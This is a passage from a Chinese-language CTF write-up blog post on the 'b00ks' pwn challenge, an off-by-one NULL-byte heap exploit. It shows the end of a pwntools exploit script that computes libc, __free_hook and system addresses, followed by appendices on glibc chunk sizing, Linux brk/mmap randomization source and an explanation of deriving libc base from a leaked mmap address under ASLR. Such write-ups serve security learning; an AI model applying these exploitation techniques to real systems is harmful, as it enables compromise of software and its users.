class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="comment"># print(&quot;one gadget: &quot; + hex(libc_base + 0xe3afe))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span> + <span class="built_in">hex</span>(libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete book3</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Enter the book id you want to delete:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="附-request2size"><a href="#附-request2size" class="headerlink" title="附 request2size"></a>附 request2size</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常量定义  </span></span><br><span class="line">SIZE_SZ = <span class="number">8</span>  <span class="comment"># 64位系统上 size_t 的大小  </span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">15</span>  <span class="comment"># 16字节对齐掩码 (0xF)  </span></span><br><span class="line">MINSIZE = <span class="number">32</span>  <span class="comment"># 假设的最小块大小  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request2size</span>(<span class="params">req</span>):  </span><br><span class="line">    <span class="keyword">if</span> req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE:  </span><br><span class="line">        <span class="keyword">return</span> MINSIZE  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(request2size(<span class="number">32</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="附-brk起始地址计算方式"><a href="#附-brk起始地址计算方式" class="headerlink" title="附 brk起始地址计算方式"></a>附 brk起始地址计算方式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">randomize_range</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> end, <span class="type">unsigned</span> <span class="type">long</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range = end - len - start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (end &lt;= start + len)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(get_random_int() % range + start);<span class="comment">// #define PAGE_ALIGN(addr) ALIGN(addr, PAGE_SIZE)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a random word for internal kernel use only. Similar to urandom but</span></span><br><span class="line"><span class="comment"> * with the goal of minimal entropy pool depletion. As a result, the random</span></span><br><span class="line"><span class="comment"> * value is not cryptographically secure but for several uses the cost of</span></span><br><span class="line"><span class="comment"> * depleting entropy is too high</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="title function_">DEFINE_PER_CPU</span><span class="params">(__u32 [MD5_DIGEST_WORDS], get_random_int_hash)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_random_int</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __u32 *hash;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arch_get_random_int(&amp;ret))</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">    hash = get_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    hash[<span class="number">0</span>] += current-&gt;pid + jiffies + random_get_entropy(); <span class="comment">//random_get_entropy This function returns the processor cycle counter value if</span></span><br><span class="line">       available, <span class="keyword">else</span> it returns zero. </span><br><span class="line">    md5_transform(hash, random_int_secret);</span><br><span class="line">    ret = hash[<span class="number">0</span>];</span><br><span class="line">    put_cpu_var(get_random_int_hash);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_random_int);</span><br></pre></td></tr></table></figure>

<h2 id="附-mmap计算方式"><a href="#附-mmap计算方式" class="headerlink" title="附 mmap计算方式"></a>附 mmap计算方式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This function, called very early during the creation of a new</span></span><br><span class="line"><span class="comment"> * process VM image, sets up which VM layout function to use:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_64bit</span><span class="params">(<span class="type">int</span> full_addr_space)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> full_addr_space ? TASK_SIZE_MAX : DEFAULT_MAP_WINDOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">task_size_max</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">    alternative_io(<span class="string">&quot;movq %[small],%0&quot;</span>,<span class="string">&quot;movq %[large],%0&quot;</span>,</span><br><span class="line">            X86_FEATURE_LA57,</span><br><span class="line">            <span class="string">&quot;=r&quot;</span> (ret),</span><br><span class="line">            [small] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">47</span>)-PAGE_SIZE),</span><br><span class="line">            [large] <span class="string">&quot;i&quot;</span> ((<span class="number">1ul</span> &lt;&lt; <span class="number">56</span>)-PAGE_SIZE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_mmap_rnd</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_rnd</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> rndbits)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(current-&gt;flags &amp; PF_RANDOMIZE))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> (get_random_long() &amp; ((<span class="number">1UL</span> &lt;&lt; rndbits) - <span class="number">1</span>)) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> rnd, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">                   <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap = rlim_stack-&gt;rlim_cur;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pad = stack_maxrandom_size(task_size) + stack_guard_gap;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> gap_min, gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Values close to RLIM_INFINITY can overflow. */</span></span><br><span class="line">    <span class="keyword">if</span> (gap + pad &gt; gap)</span><br><span class="line">        gap += pad;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Top of mmap area (just below the process stack).</span></span><br><span class="line"><span class="comment">     * Leave an at least ~128 MB hole with possible stack randomization.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    gap_min = SIZE_128M;</span><br><span class="line">    gap_max = (task_size / <span class="number">6</span>) * <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (gap &lt; gap_min)</span><br><span class="line">        gap = gap_min;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (gap &gt; gap_max)</span><br><span class="line">        gap = gap_max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> PAGE_ALIGN(task_size - gap - rnd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="附-固定地址原理"><a href="#附-固定地址原理" class="headerlink" title="附 固定地址原理"></a>附 固定地址原理</h2><p>因为，我当时是英文论坛和网友交流得出的结论，我这里直接贴我当时回复了。</p>
<p>I think brk and mmap are two different things in linux. When I malloc small space of linux, malloc will use brk. Inversely, it will use mmap for big space (almost &gt; 128KB).</p>
<p>In ASLR, both heap and mmap will have a random offset.</p>
<p>brk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">arch_randomize_brk</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> range_end = mm-&gt;brk + <span class="number">0x02000000</span>;</span><br><span class="line">    <span class="keyword">return</span> randomize_range(mm-&gt;brk, range_end, <span class="number">0</span>) ? : mm-&gt;brk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mmap</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arch_pick_mmap_layout</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags);</span><br><span class="line"></span><br><span class="line">    arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base,</span><br><span class="line">            arch_rnd(mmap64_rnd_bits), task_size_64bit(<span class="number">0</span>),</span><br><span class="line">            rlim_stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">arch_pick_mmap_base</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> *base, <span class="type">unsigned</span> <span class="type">long</span> *legacy_base,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> random_factor, <span class="type">unsigned</span> <span class="type">long</span> task_size,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> rlimit *rlim_stack)</span></span><br><span class="line">&#123;</span><br><span class="line">    *legacy_base = mmap_legacy_base(random_factor, task_size);</span><br><span class="line">    <span class="keyword">if</span> (mmap_is_legacy())</span><br><span class="line">        *base = *legacy_base;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *base = mmap_base(random_factor, task_size, rlim_stack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS: If paging is level 4, task size is 0x7ffffffff000.</p>
<p>For example, here my heap is from 0x55650f802000 and mmap area is from 0x7fdcf6d94000.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">process <span class="number">1181521</span></span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset objfile</span><br><span class="line">      <span class="number">0x55650f600000</span>     <span class="number">0x55650f602000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f801000</span>     <span class="number">0x55650f802000</span>     <span class="number">0x1000</span>     <span class="number">0x1000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x55650f802000</span>     <span class="number">0x55650f803000</span>     <span class="number">0x1000</span>     <span class="number">0x2000</span> /home/parallels/Desktop/b00ks</span><br><span class="line">      <span class="number">0x556510fde000</span>     <span class="number">0x556510fff000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [heap]</span><br><span class="line">      <span class="number">0x7fdcf6d94000</span>     <span class="number">0x7fdcf6dd6000</span>    <span class="number">0x42000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6dd6000</span>     <span class="number">0x7fdcf6df8000</span>    <span class="number">0x22000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6df8000</span>     <span class="number">0x7fdcf6f70000</span>   <span class="number">0x178000</span>    <span class="number">0x22000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6f70000</span>     <span class="number">0x7fdcf6fbe000</span>    <span class="number">0x4e000</span>   <span class="number">0x19a000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fbe000</span>     <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x4000</span>   <span class="number">0x1e7000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc2000</span>     <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x2000</span>   <span class="number">0x1eb000</span> /usr/lib/x86_64-linux-gnu/libc<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fc4000</span>     <span class="number">0x7fdcf6fca000</span>     <span class="number">0x6000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7fdcf6fdd000</span>     <span class="number">0x7fdcf6fde000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf6fde000</span>     <span class="number">0x7fdcf7001000</span>    <span class="number">0x23000</span>     <span class="number">0x1000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf7001000</span>     <span class="number">0x7fdcf7009000</span>     <span class="number">0x8000</span>    <span class="number">0x24000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700a000</span>     <span class="number">0x7fdcf700b000</span>     <span class="number">0x1000</span>    <span class="number">0x2c000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700b000</span>     <span class="number">0x7fdcf700c000</span>     <span class="number">0x1000</span>    <span class="number">0x2d000</span> /usr/lib/x86_64-linux-gnu/ld<span class="number">-2.31</span>.so</span><br><span class="line">      <span class="number">0x7fdcf700c000</span>     <span class="number">0x7fdcf700d000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> </span><br><span class="line">      <span class="number">0x7ffe19d76000</span>     <span class="number">0x7ffe19d97000</span>    <span class="number">0x21000</span>        <span class="number">0x0</span> [<span class="built_in">stack</span>]</span><br><span class="line">      <span class="number">0x7ffe19df2000</span>     <span class="number">0x7ffe19df6000</span>     <span class="number">0x4000</span>        <span class="number">0x0</span> [vvar]</span><br><span class="line">      <span class="number">0x7ffe19df6000</span>     <span class="number">0x7ffe19df8000</span>     <span class="number">0x2000</span>        <span class="number">0x0</span> [vdso]</span><br><span class="line">  <span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span>     <span class="number">0x1000</span>        <span class="number">0x0</span> [vsyscall]</span><br></pre></td></tr></table></figure>

<p>Besides, the dynamic loader uses mmap(2) with MAP_PRIVATE and appropriate permissions.</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes">https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes</a></p>
<p>So, my understanding is:</p>
<ol>
<li><p>If the program is simple, like I can fully predict what will happen e.g. when malloc will be, size of per chunk of mmap, if the program will load .so or uninstall .so, no side effect of random of time, etc. Once the address of chunk in mmap is leaked, I can calc libc base, because as you said：</p>
<ol>
<li>Both of them are relative in memory (allocated by mmap).</li>
<li>The beginning address of mapping is random, but the rest mapping is not random.</li>
</ol>
</li>
<li><p>Finally, I just need to run the program locally to the same leak address following the same steps, and then calculate the fixed offset at that point. This offset will always be valid, even with ASLR.</p>
</li>
</ol>
<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48466156/article/details/139691096">https://blog.csdn.net/qq_48466156/article/details/139691096</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit</a></p>
<p><a target="_blank" rel="noopener" href="http://www.asuka39.top/article/security/ctf/pwn/2582/">http://www.asuka39.top/article/security/ctf/pwn/2582/</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>PWN 堆利用 off-by-one NULL byte - b00ks writeup</p><p><a href="https://cl0und.github.io/2024/08/11/PWN-堆利用-off-by-one-NULL-byte-b00ks-writeup/">https://cl0und.github.io/2024/08/11/PWN-堆利用-off-by-one-NULL-byte-b00ks-writeup/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>李三（cl0und）</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2024-08-11</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2024-09-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/pwn/">pwn</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2024/08/21/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Python%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8EI-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">与AI纸上谈兵-Python协程的原理与I/O多路复用</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2024/08/10/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/"><span class="level-item">博客重启小记（2）</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/logo.png" alt="李三的剑谱"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">李三的剑谱</p><p class="is-size-6 is-block">攻/java安全研究/自动化代码审计</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Singapore</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">54</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">5</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">23</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/cL0und" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/cL0und"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/ad-security/"><span class="level-start"><span class="level-item">ad security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/binary/"><span class="level-start"><span class="level-item">binary</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/redteam/"><span class="level-start"><span class="level-item">redteam</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/web-security/"><span class="level-start"><span class="level-item">web security</span></span><span class="level-end"><span class="level-item tag">33</span></span></a></li><li><a class="level is-mobile" href="/categories/windows-security/"><span class="level-start"><span class="level-item">windows security</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-01-04T03:39:55.000Z">2025-01-04</time></p><p class="title"><a href="/2025/01/04/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Go%E4%B8%ADI-O%E5%AF%86%E9%9B%86%E5%9E%8B%E9%9C%80%E8%A6%81%E8%AE%BE%E7%BD%AEP%E8%B6%85%E8%BF%87CPU%E6%A0%B8%E5%BF%83%E6%95%B0%E5%90%97%EF%BC%9F/">与AI纸上谈兵-Go中I/O密集型需要设置P超过CPU核心数吗？</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-01-04T03:39:17.000Z">2025-01-04</time></p><p class="title"><a 